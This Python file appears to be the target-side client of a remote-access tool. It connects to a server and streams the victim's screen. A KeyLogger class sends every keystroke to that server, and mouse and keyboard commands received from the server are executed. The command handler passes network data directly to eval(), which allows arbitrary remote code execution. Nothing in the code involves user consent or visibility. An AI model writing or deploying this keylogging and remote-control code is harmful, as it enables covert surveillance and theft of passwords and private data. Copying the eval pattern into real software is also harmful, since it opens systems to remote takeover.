from Base.constants import ImageSendModes, DeviceEvents, Reasons, \
    ClientTypes, ControlDevice
from Base.settings import ACKNOWLEDGEMENT_ITERATION, \
    SERVER_PORT, SERVER_ADDRESS, IMAGE_SEND_MODE
from Base.socket_base import Socket, Config
import itertools as it
import logging
from math import log
from PIL import Image, ImageChops
from pynput.mouse import Controller as MouseController, Button as MouseButton
from pynput.keyboard import Controller as KeyController, Key, KeyCode, \
    Listener as KeyboardListener
from queue import Queue, Empty
from random import random
import subprocess
from threading import Thread
from time import sleep, time
import traceback
from typing import List, Tuple, Union


try:
    from mss import mss
except ImportError:
    logging.warn("Cannot import mss")

try:
    import gi
    gi.require_version("Gdk", "3.0")
    from gi.repository import Gdk
    from gi.overrides.GdkPixbuf import Pixbuf
except:
    logging.warn("Cannot import gi")


class Target(Socket):

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)
        self.watched = False    # Set to True if screenshot is to be sent
        self.controlling = False

        self.config = Config()

        self.control_thread = None

    def start_screen_reader(self):
        """
            starts the screen reader client.
        """
        self.screen_reader = ScreenReader()
        self.controlling = self.screen_reader.init()
        if not self.controlling:
            logging.info("Screen reader cannot connect to server. " + 
            "Either already connected or got disconnected after connection")

        i = 0
        while self.controlling:
            i+=1
            self.controlling = self.screen_reader.send_screenshot(i)
            i %= ACKNOWLEDGEMENT_ITERATION
        self.screen_reader.stop()
        self.keylogger.stop()
        logging.info("Stoping screen reader client")

    def start_controller(self):
        """
            Starts the controller.
            Calls `self.controller.controll` which populates control queues.
            Starts a new thread which fetches control instructions from queues
            and executes them.
        """
        self.controller = Controller()
        self.controlling = self.controller.init()
        Thread(target=self.controller.run_update_loop).start()

        if not self.controlling:
            logging.info("Controller cannot connect to server. " + 
            "Either already connected or got disconnected after connection")

        while self.controlling:
            try:
                self.controlling = self.controller.control()
            except (BrokenPipeError, ConnectionResetError):
                logging.info("Controller client disconnected")
                break
            sleep(0.001)
            # logging.debug(str(self.controlling))
        self.controller.stop()
        logging.info("Stoping controller client")

    def control(self):
        """
            Starts controller and screen reader clients.
        """
        self.control_thread = Thread(target=self.start_controller)
        self.control_thread.start()
        self.keylogger = KeyLogger()
        self.keylogger_thread = Thread(target=self.keylogger.start)
        self.keylogger_thread.start()
        self.start_screen_reader()

    def run(self):
        """
            Run a loop which connects to the server and waits for watcher 
            clients.
            Stops if another client for this target is already connected

            TODO: Support selective watching: Do not start all the readers,
                controllers and listeners at once. Start only the ones requested
                by the watcher.
        """
        while self.running:
            try:
                self.socket.close()
                self.socket = self.new_socket()
                logging.info("Connecting")
                self.connect()
                logging.info("Connected")
                # After the connection is established send type
                self.send_data(ClientTypes.TARGET)
                # Send unique code
                self.send_data(self.config.code.encode(self.FORMAT))
                data = b"WAIT"
                logging.info("Waiting")
                while data == b"WAIT":
                    data = self.recv_data()
                if data == Reasons.ALREADY_CONNECTED:
                    logging.info("Stopping as another client with same target"
                    " code is already connected")
                    self.stop()
                    return
                elif data == b"OK":
                    logging.info("Starting ScreenReader and Controller")
                    self.controlling = True
                    self.control()
                self.controlling = False
                self.socket.close()
                logging.info("Disconnected. Stopped sending Target data.")

            except TimeoutError:
                logging.critical("Connection Timed Out")
            except (BrokenPipeError, ConnectionResetError):
                logging.critical("Disconnected. Trying to reconnect in 2 sec")
            except ConnectionRefusedError:
                logging.critical("Connection refused")
            except OSError:
                logging.critical(f"OSError Occured\n"
                    f"{traceback.format_exc()}\n")
            except KeyboardInterrupt:
                self.stop()
                return
            sleep(1)

    def start(self):
        """
            The main start function. Use this to start the target client
        """
        if not self.controlling:
            self.running = True
            self.run()

    def stop(self):
        """
            Stop this target client and exit
        """
        self.running = False
        self.controlling = False
        if hasattr(self, "controller"):
            self.controller.stop()
        if hasattr(self, "keylogger"):
            self.keylogger.stop()


class ScreenReader(Socket):

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)
        self.config = Config()
        self.prev_img = None
        self.mss = None

    def init(self) -> bool:
        """
            initiate connections and return True if connection 
            was established else False
        """
        self.connect()
        self.send_data(ClientTypes.TARGET_SCREEN_READER)
        self.send_data(self.config.code.encode(self.FORMAT))
        data = self.recv_data()
        if data == b"OK":
            return True
        elif data == Reasons.ALREADY_CONNECTED:
            return False
        return False

    def send_screenshot(self, i) -> bool:
        """ 
            Returns True if the screenshot was successfully 
            sent, False otherwise

            Analysis of time required to
            send over network > convert to bytes > take screenshot
            TODO: (optional) Resize image according to network speed 
            to maintain framerate
        """
        t1 = time()
        img = self.take_screenshot()

        if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
            img_bin = self.image2bin(img)
        elif IMAGE_SEND_MODE == ImageSendModes.DIFF:
            if self.prev_img is None:
                diff = img
            else:
                diff = ImageChops.subtract_modulo(self.prev_img, img)
            # diff = Image.fromarray(np.array(diff))
            self.prev_img = img
            # t1_2 = time()
            img_bin = self.image2bin(diff)
        elif IMAGE_SEND_MODE == ImageSendModes.CHANGES:
            # TODO: Complete this option
            if self.prev_img is None:
                self.prev_img = img
                img_bins = [([0, 0, *Mouse.get_screen_size()], 
                    self.image2bin(img))]
            else:
                img_bins = self.get_all_diffs()
        try:
            # t2 = time()
            if IMAGE_SEND_MODE in (ImageSendModes.DIFF, ImageSendModes.DIRECT_JPG):
                self.send_data(img_bin)  # send the image
                # logging.debug(f"{len(img_bin)/1024}")

            if i==ACKNOWLEDGEMENT_ITERATION:
                self.recv_data()
            t3 = time()

            # to eat less cpu
            if t3-t1 < 0.4:
                sleep(0.1)
            # logging.debug(f"{t1_2-t1} {t2-t1_2}, {t3-t2}, {len(img_bin)/1024}, {i}")
        except (ConnectionResetError, BrokenPipeError):
            return False
        return True

    def get_all_diffs(self, prev_img, img):
        pass

    def stop(self) -> None:
        """
            Stop the screen reader. No extra thread was run by this class
            so only closing socket.
        """
        self.socket.close()

    def take_screenshot(self) -> Image:
        """
            Generic screenshot function that uses screenshot 
            tool based on platform.
        """
        if 'linux' in self.platform:
            img = self.take_screenshot_mss()
            # img = self.take_screenshot_pygobject()
        else:
            img = self.take_screenshot_PIL()

        return img

    def take_screenshot_pygobject(self) -> Image:
        """
            Take screenshot using PyGobject.
            Tested on Gnome only. Might not work on other desktop environments.
        """
        window = Gdk.get_default_root_window()
        x, y, width, height = window.get_geometry()
        pb: Pixbuf = Gdk.pixbuf_get_from_window(window, x, y, width, height)
        img = self.pixbuf2image(pb)
        img = img.resize((img.size[0]//2, img.size[1]//2), Image.ANTIALIAS)
        return img

    def pixbuf2image(self, pix) -> Image:
        """Convert gdkpixbuf to PIL image"""
        data = pix.get_pixels()
        w = pix.props.width
        h = pix.props.height
        stride = pix.props.rowstride
        mode = "RGB"
        if pix.props.has_alpha == True:
            mode = "RGBA"
        img = Image.frombytes(mode, (w, h), data, "raw", mode, stride)
        return img

    def image2bin(self, img: Image) -> bytes:
        """
            Convert PIL Image to bytes
        """
        import io
        bio = io.BytesIO()
        if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
            img.save(bio, format="JPEG", quality=15)
        else:
            img.save(bio, format=self.config.IMG_FORMAT)
        return bio.getvalue()

    def pixbuf_to_bin(self, pb) -> bytes:
        """
            Convert gdkpixbuf to binary
        """
        return self.image2bin(self.pixbuf2image(pb))

    def take_screenshot_PIL(self) -> Image:
        """
            Take screenshot using PIL
            Works on most platforms but is damn slow.
        """
        from PIL import ImageGrab
        return ImageGrab.grab()

    def take_screenshot_mss(self, resize_factor=1) -> Image:
        """
            Take a screenshot using mss package.
            mss screenshot is 3x faster than gi screenshot.
            TODO: test on other platforms also
        """
        if self.mss is None:
            self.mss = mss()
        img = self.mss.grab(self.mss.monitors[0])
        pilImg = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
        # pilImg = pilImg.resize((int(pilImg.size[0]*resize_factor), 
        #     int(pilImg.size[1]*resize_factor)), Image.Resampling.LANCZOS)
        return pilImg


class Controller(Socket):

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.mouse = Mouse()
        self.keyboard = Keyboard()

    def init(self) -> bool:
        """
            Initiate connection to server. Returns True if 
            connection is successfull else False.
        """
        self.connect()
        self.send_data(ClientTypes.TARGET_CONTROLLER)
        self.send_data(self.config.code.encode(self.FORMAT))
        data = self.recv_data()
        if data == b"OK":
            self.running = True
            return True
        elif data == Reasons.ALREADY_CONNECTED:
            return False
        return False

    def control(self):
        """
            Receive control requests and put them in corresponding
            queues based on `control_type`
        """
        try:
            ctrl_ev = self.recv_data()
            control_type, *event = eval(ctrl_ev)
        except (BrokenPipeError, ConnectionResetError, SyntaxError):
            return False

        if control_type == ControlDevice.CONTROL_MOUSE:
            self.mouse.events.put(event)
        elif control_type == ControlDevice.CONTROL_KEYBOARD:
            self.keyboard.events.put(event)
        return True

    def run_update_loop(self):
        """
            Runs the loop that runs update for each controller
        """
        logging.info("Starting update loop")
        self.running = True
        while self.running:
            self.mouse.update()
            self.keyboard.update()
            sleep(0.001)

    def stop(self):
        self.running = False


class Keyboard(object):
    """
        TODO: Release all pressed keys (if still remained pressed)
        when exiting
    """

    def __init__(self) -> None:
        self.key_controller = KeyController()
        self.events: Queue[List[int, int]] = Queue()

    def update(self):
        if self.events.empty():
            return
        ev_type, vk = self.events.get()
        if ev_type == DeviceEvents.KEY_DOWN:
            self.key_controller.press(KeyCode.from_vk(vk))
        elif ev_type == DeviceEvents.KEY_UP:
            self.key_controller.release(KeyCode.from_vk(vk))


class Mouse(object):

    def __init__(self) -> None:
        self.mouse_controller = MouseController()
        self.events: Queue[List[int, str, Tuple]] = Queue()
        self.screen_size = self.get_screen_size()
        logging.debug(f"screen size: {self.screen_size}")
        self.btns = {
            "left": MouseButton.left,
            "right": MouseButton.right,
            "middle": MouseButton.middle,
            "scrolldown": MouseButton.scroll_down,
            "scrollup": MouseButton.scroll_up,
            "scrollleft": MouseButton.scroll_left,
            "scrollright": MouseButton.scroll_right,
        }

    def update(self):
        """
            Fetch mouse control requests from queue and handle them.
        """
        if self.events.empty():
            return
        self.screen_size = self.get_screen_size()
        ev_type, btn, rel_pos = self.events.get()
        pos = (
            rel_pos[0]*self.screen_size[0],
            (1-rel_pos[1])*self.screen_size[1]
        )
        self.mouse_controller.position = pos
        if ev_type == DeviceEvents.MOUSE_DOWN:
            self.mouse_controller.press(self.btns[btn])
        elif ev_type == DeviceEvents.MOUSE_UP:
            self.mouse_controller.release(self.btns[btn])

    def get_events(self):
        """
            Fetches requests from queue and returns them as a list
        """
        clicks = []
        while not self.events.empty():
            try:
                clicks.append(self.events.get_nowait())
            except Empty:
                break
        return clicks

    @staticmethod
    def get_screen_size():
        """
            Returns the resolution of the screen
        """
        # return list(pg.size())
        try:
            m = mss()
            mon = m.monitors[0]
            return [mon['width'], mon['height']]
        except NameError:   # mss not imported
            cmd = ['xrandr']
            cmd2 = ['grep', '*']
            xrandr = subprocess.Popen(cmd, stdout=subprocess.PIPE)
            grep = subprocess.Popen(cmd2, stdin=xrandr.stdout, 
                stdout=subprocess.PIPE)
            res, _ = grep.communicate()
            resolution = res.split()[0].decode("utf-8")
            return [int(i) for i in resolution.split('x')]


class KeyLogger(Socket):
    """
        send all keys pressed to the server`
    """

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.listener = KeyboardListener(on_press=self.on_key_press,
                                         on_release=self.on_key_release)
        self.vks: Queue[Tuple[int, int]] = Queue()

    def on_key_press(self, key: Union[Key, KeyCode, None]):
        if isinstance(key, Key):
            key = key.value
        self.vks.put((DeviceEvents.KEY_DOWN, key.vk))

    def on_key_release(self, key: Union[Key, KeyCode, None]):
        if isinstance(key, Key):
            key = key.value
        self.vks.put((DeviceEvents.KEY_UP, key.vk))

    def start(self):
        """
            Start the keylogger. Connect to the server.
        """

        logging.info("Starting keylogger")

        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return

        try:
            self.send_data(ClientTypes.TARGET_KEYLOGGER)
            self.send_data(self.config.code.encode(self.FORMAT))
            self.recv_data()  # receive b"OK"
        except (BrokenPipeError, ConnectionResetError):
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return

        self.running = True
        self.listener.start()
        self.run()

    def run(self):
        """
            Send the logged keys to the server.
        """
        while self.running:
            try:
                if self.vks.empty():
                    sleep(0.1)
                    continue

                vks = b"\0".join(map(
                    lambda x: x.to_bytes(int(log(x, 256)) + 1, "big"),
                    it.chain(*self.get_keys())
                ))
                logging.debug(vks)
                self.send_data(vks)
            except (ConnectionResetError, BrokenPipeError):
                logging.info("Stoping Keyboard Controller")
                break

        self.stop()

    def get_keys(self) -> Tuple[Tuple[int, int]]:
        """
            Fetches requests from queue and returns them as a list
        """
        keys = []
        while not self.vks.empty():
            try:
                keys.append(self.vks.get_nowait())
            except Empty:
                break
        return tuple(keys)

    def stop(self):
        self.running = False
        self.socket.close()
        self.listener.stop()


def check_update():
    """
        check for updates
        matches current version of code to the one present on the server
        if they are different then download target again
        returns true if there are updates
    """

    pass


if __name__ == "__main__":
    if check_update():
        print("exiting due to update")
        exit(0)

    # start the main process
    logging.info("Starting target")
    target = Target()
    try:
        target.start()
    except KeyboardInterrupt:
        target.stop()

    logging.info("Stopped Target.")